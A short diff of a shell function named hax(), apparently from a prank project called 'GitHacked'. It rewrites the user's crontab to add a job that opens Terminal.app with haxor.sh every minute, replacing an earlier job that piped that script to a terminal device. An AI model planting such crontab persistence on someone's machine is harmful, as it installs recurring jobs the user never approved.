@@ -6,8 +6,8 @@ hax()
     #write out current crontab
     crontab -l > haxcron;
     #echo new cron into cron file
-    echo "*/1 * * * * ~/GitHacked/haxor.sh > /dev/ttys000" >> haxcron;
-    echo "*/1 * * * * open -a Terminal.app .hacked" >> haxcron;
+    #echo "*/1 * * * * ~/GitHacked/haxor.sh > /dev/ttys000" >> haxcron;
+    echo "*/1 * * * * open -a Terminal.app ~/GitHacked/haxor.sh" >> haxcron;
     #install new cron file
     crontab haxcron;
     rm haxcron;
